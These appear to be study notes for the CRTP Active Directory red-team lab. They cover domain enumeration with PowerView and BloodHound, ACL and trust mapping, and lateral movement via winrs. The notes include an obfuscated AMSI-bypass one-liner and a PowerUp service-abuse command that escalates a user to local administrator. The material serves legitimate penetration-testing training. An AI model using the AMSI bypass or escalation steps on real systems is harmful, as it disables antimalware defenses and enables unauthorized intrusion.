# 📝 Certified Red Team Professional (CRTP) - Notes

<div align="left"><figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1).png" alt="" width="207"><figcaption><p><a href="https://www.alteredsecurity.com/post/certified-red-team-professional-crtp">https://www.alteredsecurity.com/post/certified-red-team-professional-crtp</a></p></figcaption></figure></div>

{% embed url="https://www.alteredsecurity.com/post/certified-red-team-professional-crtp" %}

{% hint style="info" %}
All contributions to the project to improve it, add new contributions, correct it and update it are welcome.
{% endhint %}

## What is Certified Red Team Professional? <a href="#viewer-d2lek" id="viewer-d2lek"></a>

Altered Security's Certified Red Team Professional (**CRTP**) is a beginner friendly hands-on **red team** certification. It is one of the most popular beginner Red Team certification.

A certification holder has the skills to understand and assess security of an E**nterprise Active Directory** environment.

### What are the requirements for CRTP certification? <a href="#viewer-esim4" id="viewer-esim4"></a>

To get certified, a student must solve a 24 hours hands-on exam in a fully patched Enterprise Active Directory environment containing multiple domains and forests. Like the course, the certification challenges a student to compromise the exam environment using feature abuse and functionalities.

### What is the goal of the CRTP exam? <a href="#viewer-lgmk" id="viewer-lgmk"></a>

The 24 hour hands-on exam consists of 5 target servers in addition to a foothold student machine. The goal is to OS level command execution on all 5 targets.

### Who owns the Certified Red Team Professional (CRTP)? <a href="#viewer-2he9v" id="viewer-2he9v"></a>

Altered Security owns the courses, labs and certification name. We used to offer this in partnership with Pentester Academy. However, the reseller contract ended on 15th January 2023.

### Does the Certified Red Team Professional (CRTP) certificate expire? <a href="#viewer-f56kk" id="viewer-f56kk"></a>

Yes, the CRTP certificate has a validity of 3 years to keep up with changing technologies and skill requirements. You can renew the certificate without any additional costs. You can find the renewal process here - https://www.alteredsecurity.com/post/renewal-process-for-altered-security-certifications

### Does Attacking and Defending Active Directory or CRTP labs use updated Windows version? <a href="#viewer-9cjc7" id="viewer-9cjc7"></a>

Yes! The CRTP labs are updated to Server 2022. The lab mimics a real world enterprise environment and the users need to rely on misconfigurations and feature abuse to challenge the lab.

<figure><img src="https://static.wixstatic.com/media/628794_3744024c76874b21808fcc3765e6f663~mv2.png/v1/fill/w_740,h_329,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/628794_3744024c76874b21808fcc3765e6f663~mv2.png" alt="CRTP Lab"><figcaption><p>CRTP Lab</p></figcaption></figure>

## What will you Learn?

The Attacking and Defending Active Directory Lab enables you to:

* Practice various attacks in a fully patched realistic Windows environment with Server 2022 and SQL Server 2017 machine.
* Multiple domains and forests to understand and practice cross trust attacks.
* Learn and understand concepts of well-known Windows and Active Directory attacks.
* Learn to use Windows as an attack platform and using trusted features of the OS like .NET, PowerShell and others for attacks.
* Bypassing defenses like Windows Defender, Microsoft Defender for Endpoint (MDE) and Microsoft Defender for Identity (MDI).

## Course duration & Topics ⏳📚 <a href="#course-duration-and-topics" id="course-duration-and-topics"></a>

23 Learning Objectives, 59 Tasks, > _120 Hours of Torture_

**1 - Active Directory Enumeration**

* Use scripts, built-in tools and Active Directory module to enumerate the target domain.
* Understand and practice how useful information like users, groups, group memberships, computers, user properties etc. from the domain controller is available to even a normal user.
* Understand and enumerate intra-forest and inter-forest trusts. Practice how to extract information from the trusts.
* Enumerate Group policies.
* Enumerate ACLs and learn to find out interesting rights on ACLs in the target domain to carry out attacks.
* Learn to use BloodHound and understand its applications in a red team operation.

**2 - Offensive PowerShell Tradecraft**

* Learn how PowerShell tools can still be used for enumeration.
* Learn to modify existing tools to bypass Windows Defender.
* Bypass PowerShell security controls and enhanced logging like System Wide Transcription, Anti Malware Scan Interface (AMSI), Script Blok Logging and Constrained Language Mode (CLM)

**3 - Offensive .NET Tradecraft**

* Learn how to modify and use .NET tools to bypass Windows Defender and Microsoft Defender for Endpoint (MDE).
* Learn to use .NET Loaders that can run assemblies in-memory.

**4 - Local Privilege Escalation**

* Learn and practice different local privilege escalation techniques on a Windows machine.
* Hunt for local admin privileges on machines in the target domain using multiple methods.
* Abuse enterprise applications to execute complex attack paths that involve bypassing antivirus and pivoting to different machines.

**5 - Domain Privilege Escalation**

* Learn to find credentials and sessions of high privileges domain accounts like Domain Administrators, extracting their credentials and then using credential replay attacks to escalate privileges, all of this with just using built-in protocols for pivoting.
* Learn to extract credentials from a restricted environment where application whitelisting is enforced. Abuse derivative local admin privileges and pivot to other machines to escalate privileges to domain level.
* Understand the classic Kerberoast and its variants to escalate privileges.
* Enumerate the domain for objects with unconstrained delegation and abuse it to escalate privileges.
* Find domain objects with constrained delegation enabled. Understand and execute the attacks against such objects to escalate privileges to a single service on a machine and to the domain administrator using alternate tickets.
* Learn how to abuse privileges of Protected Groups to escalate privileges

**6 - Domain Persistence and Dominance**

* Abuse Kerberos functionality to persist with DA privileges. Forge tickets to execute attacks like Golden ticket, Silver ticket and Diamond ticket to persist.
* Subvert the authentication on the domain level with Skeleton key and custom SSP.
* Abuse the DC safe mode Administrator for persistence.
* Abuse the protection mechanism like AdminSDHolder for persistence.
* Abuse minimal rights required for attacks like DCSync by modifying ACLs of domain objects.
* Learn to modify the host security descriptors of the domain controller to persist and execute commands without needing DA privileges.

**7 - Cross Trust Attacks**

* Learn to elevate privileges from Domain Admin of a child domain to Enterprise Admin on the forest root by abusing Trust keys and krbtgt account.
* Execute intra-forest trust attacks to access resources across forest.
* Abuse SQL Server database links to achieve code execution across forest by just using the databases.

**8 - Abusing AD CS**&#x20;

* Learn about Active Directory Certificate Services and execute some of the most popular attacks.
* Execute attacks across Domain trusts to escalate privileges to Enterprise Admins.

**9 - Defenses and bypass – MDE EDR**

* Learn about Microsoft’s EDR – Microsoft Defender for Endpoint.
* Understand the telemetry and components used by MDE for detection.
* Execute an entire chain of attacks across forest trust without triggering any alert by MDE.
* Use Security 365 dashboard to verify MDE bypass.

**10 - Defenses and bypass – MDI**

* Learn about Microsoft Identity Protection (MDI).
* Understand how MDI relies on anomaly to spot an attack.
* Bypass various MDI detections throughout the course.

**11 - Defenses and bypass – Architecture and Work Culture Changes**

* Learn briefly about architecture and work culture changes required in an organization to avoid the discussed attacks. We discuss Temporal group membership, ACL Auditing, LAPS, SID Filtering, Selective Authentication, credential guard, device guard, Protected Users Group, PAW, Tiered Administration and ESAE or Red Forest

**12 - Defenses – Monitoring**

* Learn about useful events logged when the discussed attacks are executed.

**13 - Defenses and Bypass – Deception**

* Understand how Deception can be effective deployed as a defense mechanism in AD.
* Deploy decoy user objects, which have interesting properties set, which have ACL rights over other users and have high privilege access in the domain along with available protections.
* Deploy computer objects and Group objects to deceive an adversary.
* Learn how adversaries can identify decoy objects and how defenders can avoid the detection.

_____


## Instructions
* All commands is running by PowerView
* Please remember to turn-off or add an exception to your student VMs firewall when your run listener for a reverse shell
* Using Invisi-Shell to avoid enhanced logging
* AMSI bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Objective 1
```
Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
• Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
• Find a file share where studentx has Write permissions.
```
### Invisi-Shell
* C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

### Return all users or specific user objects in AD
* Get-DomainUser
* Get-DomainUser | select -ExpandProperty samaccountname

### Member computers
* Get-DomainComputer | select -ExpandProperty dnshostname
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
```

### Details of the Domain Admins group 
* Get-DomainGroup -Identity "Domain Admins"

### Enumerate members of the Domain Admins group
* Get-DomainGroupMember -Identity "Domain Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

### BloodHound ingestores
* C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL Container,ObjectProps,SPNTargets --excludedcs

### File with all servers
* cat C:\AD\Tools\servers.txt 
```
DCORP-ADMINSRV 
DCORP-APPSRV 
DCORP-CI 
DCORP-MGMT 
DCORP-MSSQL 
DCORP-SQL1
DCORP-STDADMIN
DCORP-STD2
DCORP-STUDENT1
```

### File share where studentx has Write permissions, Use the PowerHuntShares to search for file shares.
* Import-Module C:\AD\Tools\PowerHuntShares.psm1
* Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```
with the top 200 share names.
[*][12/24/2024 04:02] - 2 ADMIN$
[*][12/24/2024 04:02] - 2 C$
[*][12/24/2024 04:02] - 1 studentshare2
[*][12/24/2024 04:02] - 1 AI
[*] -----------------------------------------------
[*][12/24/2024 04:02] - Generating HTML Report
[*][12/24/2024 04:02] - Estimated generation time: 1 minute or less
[*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
```

![alt text](image-6.png)

![alt text](image-7.png)

## Objective 2:
```
• Enumerate following for the dollarcorp domain:
− ACL for the Domain Admins group
− ACLs where studentx has interesting permissions
• Analyze the permissions for studentx in BloodHound UI
```

### Enumerate ACLs for the Domain Admins Group
* Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

### Check for modify rights/permissions
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"} 
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
ObjectDN : 
CN=ControlxUser,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier : AccessAllowed
ActiveDirectoryRights : GenericAll
ObjectAceType : None
AceFlags : None
AceType : AccessAllowed
InheritanceFlags : None
SecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-1123
IdentityReferenceName : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN : CN=RDP 
Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass : group
```

### Analyze the permissions for studentx using BloodHound UI
### Let’s look at the 'Outbound Object Control' for the studentx
```
Multiple permissions stand out in the above diagram. Due to the membership of the RDPUsers group, 
the studentx user has following interesting permissions
- Full Control/Generic All over supportx and controlx users. 
- Enrollment permissions on multiple certificate templates.
- Full Control/Generic All on the Applocked Group Policy.
```

![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)

## Objective 3
```
• Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the DevOps OU
− List the GPOs 
− Enumerate GPO applied on the DevOps OU
− Enumerate ACLs for the Applocked and DevOps GPOs
```

### List all the OUs
* Get-DomainOU
* Get-DomainOU | select -ExpandProperty name

### List all the computers in the DevOps OU
* (Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
Domain Controllers
StudentMachines
Applocked
Servers
DevOps
```

### List all the GPOs
* Get-DomainGPO
```
flags : 0
systemflags : -1946157056
displayname : Default Domain Policy
[snip]
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

### Enumerate GPO applied on the DevOps OU (we need the name of the policy from the gplink attribute from the OU)
* (Get-DomainOU -Identity DevOps).gplink
```
LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

### More informations about this GPO
* Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged : 314489
dscorepropagationdata : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath : 
\\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8
D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated : 12/18/2024 7:31:22 AM
showinadvancedviewonly : True
usncreated : 293100
gpcfunctionalityversion : 2
instancetype : 4
objectclass : {top, container, groupPolicyContainer}
objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

### To enumerate the ACLs for the Applocked and DevOps GPO, let's use the BloodHound CE UI
![alt text](image-3.png)
![alt text](image-5.png)

**A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.**

## Objective 4
```
• Enumerate all domains in the moneycorp.local forest. 
• Map the trusts of the dollarcorp.moneycorp.local domain.
• Map External trusts in moneycorp.local forest. 
• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
```

### Enumerate all domains in the current forest
* Get-ForestDomain -Verbose

### Map all the trusts of the dollarcorp domain
* Get-DomainTrust
```
SourceName : dollarcorp.moneycorp.local
TargetName : moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 5:59:01 AM
WhenChanged : 2/24/2023 9:11:33 AM

SourceName : dollarcorp.moneycorp.local
TargetName : us.dollarcorp.moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 6:22:51 AM
WhenChanged : 2/24/2023 9:09:58 AM

SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### list only the external trusts in the moneycorp.local forest
* Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### Identify external trusts of the dollarcorp domain
*  Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

**Since the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest**
* Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}


## Objective 5
```
• Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
• Identify a machine in the domain where studentx has local administrative access.
• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
```

### Local Privilege Escalation - PowerUp
**We can use Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS**

* . C:\AD\Tools\PowerUp.ps1
* Invoke-AllChecks
```
[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
[snip]

[*] Checking service executable and argument permissions...
ServiceName : AbyssWebServer
AlteredSecurity Attacking and Defending Active Directory 35
Path : C:\WebServer\Abyss Web Server\abyssws.exe -
service
ModifiableFile : C:\WebServer\Abyss Web Server
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes, 
Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName : LocalSystem
AbuseFunction : Install-ServiceBinary -Name 
'AbyssWebServer'
CanRestart : True

[snip]
[*] Checking service permissions...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart : True
```

### Abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group

*  Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```
VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
VERBOSE: Executing command 'net localgroup Administrators dcorp\student1 /add'
VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\studentx /add'
```

**We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!**

### Hunt for Local Admin access

**To identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1**

* . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* Find-PSRemotingLocalAdminAccess
```
dcorp-adminsrv
```

**Studentx has administrative access on dcorp-adminsrv and on the student machine.** 
**We can connect to dcorp-adminsrv using winrs as the student user**

* winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

* set username
```
set username
USERNAME=studentx
```

* set computername
```
computername
COMPUTERNAME=dcorp-adminsrv
```

**PowerShell Remoting**
* Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

* [dcorp-adminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents>$env:username
```
dcorp\studentx
```

